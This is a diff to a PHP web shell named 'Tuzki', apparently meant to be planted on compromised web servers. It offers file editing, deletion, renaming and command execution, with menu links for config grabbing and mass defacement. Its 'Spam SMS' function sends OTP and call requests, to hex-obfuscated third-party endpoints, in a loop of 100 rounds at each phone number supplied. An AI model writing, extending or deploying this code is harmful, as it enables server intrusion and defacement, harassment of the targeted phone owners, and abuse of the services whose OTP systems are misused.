@@ -133,8 +133,13 @@ body {
 	#textarea {
 	background: transparent;
 	width: 1066px;
-	font-family: 'Orbitron';
 	height: 500px;
+	font-family: Arial, Helvetica, monospace;
+	color:lavender;
+	}
+	#input {
+	background: transparent;
+	width: 120px;
 	font-family: Arial, Helvetica, monospace;
 	color:lavender;
 	}
@@ -149,10 +154,17 @@ body {
 	<body>
 <?php
 // FUNCTION
+function post_data($url, $data) {
+	$ch = curl_init($url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	return curl_exec($ch);
+	curl_close($ch);
+}
 function home() {
-?>
-	<script>window.location='?';</script>
-	<?php
+	echo "<script>window.location='?';</script>";
 }
 function spamsms() {
 ?>
@@ -165,34 +177,30 @@ function spamsms() {
 </form>
 </center>
 <?php
-	function post_data($url, $data) {
-		$ch = curl_init($url);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-		return curl_exec($ch);
-		curl_close($ch);
-	}
-	if (isset($_POST['action'])) {
-		$no = explode("\n", $_POST['no']);
-		$no = str_replace(' ', '', $no);
-		$no = str_replace("\n\n", "\n", $no);
+if (isset($_POST['action'])) {
+	$no = explode("\n", $_POST['no']);
+	$no = str_replace(' ', '', $no);
+	$no = str_replace("\n\n", "\n", $no);
+	foreach ($no as $on):
+		echo "<hr>Calling     -> " . $on . "<hr><br>";
+	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70", "msisdn=" . $on . "&accept=call");
+	endforeach;
+	for ($x = 0;$x < 100;$x++) {
 		foreach ($no as $on):
-			echo "<hr>Calling     -> " . $on . "<hr><br>";
-			post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70", "msisdn=" . $on . "&accept=call");
-		endforeach;
-		for ($x = 0;$x < 100;$x++) {
-			foreach ($no as $on):
-				echo "<hr>Send OTP To -> " . $on . "<hr><br>";
-				post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73", "phone=" . $on . "&smsType=1");
-				post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50", "phone_number=" . $on);
-			endforeach;
-		}
+		echo "<hr>Send OTP To -> " . $on . "<hr><br>";
+		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73", "phone=" . $on . "&smsType=1");
+		post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50", "phone_number=" . $on);
+	endforeach;
 	}
-	else {
-		die();
-	}
+} else {
+	die();
+}
+die();
+}
+function music() {
+	echo "<center>";
+	echo "<iframe width='700px' height='500px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
+	echo "</center>";
 	die();
 }
 function jumping() {
@@ -221,13 +229,10 @@ function alert($message) {
 }
 function edit($filename) {
 	if (isset($_POST['text'])) {
-		// save the text contents
 		file_put_contents($filename, $_POST['text']);
 	}
-	// read the textfile
 	$text = file_get_contents($filename);
 ?>
-<!-- HTML form -->
 <form action="" method="post">
 <center>
 <h5>Files Editor : <?php echo $filename; ?></h5>
@@ -270,6 +275,26 @@ function cmd($cmd) {
 		return $buff;
 	}
 }
+function renames($filename) {
+	if(isset($_POST['action'])) {
+		if(@rename($filename,$_POST['newname'])) {
+			alert("Success");
+			home();
+		} else {
+			alert("Permission Denied");
+			home();
+		}
+	}
+	?>
+	<form method='post'>
+		<center>
+	<td>Filename : <input type='text' class='input-sm' id='input' value='<?php echo basename($filename);?>' name='newname'></td>
+	<input type='submit' class='btn btn-danger' name='action' value='rename'>
+	</center>
+	</form>
+	<?php
+	die();
+}
 // ENDFUNCTION
 
 ?>
@@ -278,6 +303,7 @@ function cmd($cmd) {
 		<h1>Tuzki</h1>
 		<li><a href='?do=home'>[ Home ]</a></li>
 		<li><a href='?do=sms'>[ Spam SMS ]</a></li>
+		<li><a href='?do=music'>[ Music ]</a></li>
 		<li><a href='?do=jumping'>[ Jumping ]</a></li>
 		<li><a href='?do=config'>[ Config ]</a></li>
 		<li><a href='?do=mass_deface'>[ Mass Deface ]</a></li>
@@ -291,6 +317,9 @@ if ($_GET['do'] == 'home') {
 }
 elseif ($_GET['do'] == 'sms') {
 	spamsms();
+}
+elseif($_GET['do'] == 'music') {
+	music();
 }
 elseif ($_GET['do'] == 'jumping') {
 	jumping();
@@ -324,6 +353,9 @@ elseif($_GET['do'] == 'delete' and isset($_GET['files'])) {
 		alert("Permission Denied");
 	}
 }
+elseif($_GET['do'] == 'rename' and isset($_GET['files'])) {
+	renames($_GET['files']);
+}
 $dir = scandir(getcwd());
 foreach ($dir as $dir):
 ?>
@@ -343,25 +375,25 @@ foreach ($dir as $dir):
 		echo "<a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;'>
 		<a href='?'>Chmod | </a>
-		<a href='?'>Rename | </a>
+		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename | </a>
 		<a href='?'>Downlod | </a>
 		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
 	elseif ($ext == 'jpg' OR $ext == 'png' OR $ext == 'jpeg' OR $ext == 'gif' OR $ext == 'rar' OR $ext == 'zip' OR $ext == 'doc' OR $ext == 'pdf') {
 		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
-		echo "<a style='color:green' href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+		echo "<a href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;'>
 		<a href='?'> Chmod | </a>
-		<a href='?'>Rename | </a>
+		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename | </a>
 		<a href='?'>Downlod | </a>
 		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
 	else {
 		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
-		echo "<a style='color:green' href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+		echo "<a href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;'>
 		<a href='?'> Chmod | </a>
-		<a href='?'>Rename | </a>
+		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename | </a>
 		<a href='?'>Downlod | </a>
 		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
